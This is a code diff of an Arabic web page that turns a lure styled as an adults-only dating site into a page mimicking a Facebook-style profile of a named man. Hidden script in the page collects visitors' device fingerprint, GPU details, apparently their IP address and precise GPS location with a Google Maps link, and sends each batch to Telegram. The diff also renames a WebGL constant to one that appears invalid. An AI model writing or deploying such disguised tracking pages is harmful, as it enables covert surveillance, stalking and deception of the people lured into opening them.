@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تعارف للكبار فقط</title>
+    <title>صفحة سامح السيد</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(to right, #ff758c, #ff7eb3);
+            background-color: #f0f2f5;
             margin: 0;
             display: flex;
             justify-content: center;
@@ -17,7 +17,7 @@
         }
         .container {
             max-width: 800px;
-            background-color: rgba(255, 255, 255, 0.9);
+            background-color: #fff;
             border-radius: 10px;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             overflow: hidden;
@@ -27,6 +27,8 @@
         }
         .header {
             padding: 20px;
+            background-color: #4267B2;
+            color: #fff;
         }
         .header img {
             width: 150px;
@@ -35,7 +37,6 @@
         .header h1 {
             margin: 10px 0;
             font-size: 24px;
-            color: #ff758c;
         }
         .content {
             padding: 20px;
@@ -57,7 +58,7 @@
             width: 100px;
             height: 100px;
             border-radius: 50%;
-            border: 2px solid #ff758c;
+            border: 2px solid #4267B2;
         }
         .profile p {
             margin-top: 5px;
@@ -69,7 +70,7 @@
             font-size: 14px;
         }
         .footer a {
-            color: #ff758c;
+            color: #4267B2;
             text-decoration: none;
         }
         .overlay {
@@ -92,7 +93,7 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
         }
         .overlay .popup button {
-            background-color: #ff758c;
+            background-color: #4267B2;
             color: #fff;
             border: none;
             padding: 10px 20px;
@@ -112,8 +113,8 @@
 
     <div class="container" id="content" style="display: none;">
         <div class="header">
-            <img src="https://example.com/image.jpg" alt="فتاة مثيرة">
-            <h1>مرحبا بك في موقع التعارف للكبار فقط</h1>
+            <img src="https://example.com/image.jpg" alt="سامح السيد">
+            <h1>سامح السيد</h1>
         </div>
         <div class="content">
             <p>استمتع بالتعرف على أشخاص جدد ومشاهدة محتوى حصري للكبار فقط.</p>
@@ -184,14 +185,14 @@
             if (gl) {
                 debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
-                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
+                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) || 'غير متوفر';
             }
 
             var ht = window.screen.height;
             var wd = window.screen.width;
             var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';
 
-            var deviceInfo = `منصة الجهاز: ${ptf}\نعدد النوى: ${cc}\ن الذاكرة العشوائية: ${ram}\ن نوع المتصفح: ${brw}\ن نظام التشغيل: ${os}\ن دقة الشاشة: ${ht}x${wd}\ن الشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\ن نوع وحدة المعالجة الرسومية: ${ren}`;
+            var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
             sendInformationToTelegram(deviceInfo);
 
             // Collect IP address
@@ -216,7 +217,7 @@
                     var spd = position.coords.speed || 'غير متوفر';
 
                     var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
-                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\ن دقة الموقع: ${acc} متر\n الارتفاع: ${alt} متر\n الاتجاه: ${dir} درجة\n السرعة: ${spd} متر/ثانية\n\n رابط الموقع على جوجل مابس: ${googleMapsLink}`;
+                    var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nدقة الموقع: ${acc} متر\nالارتفاع: ${alt} متر\nالاتجاه: ${dir} درجة\nالسرعة: ${spd} متر/ثانية\n\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
                     sendInformationToTelegram(locationInfo);
 
                     document.getElementById('overlay').style.display = 'none';
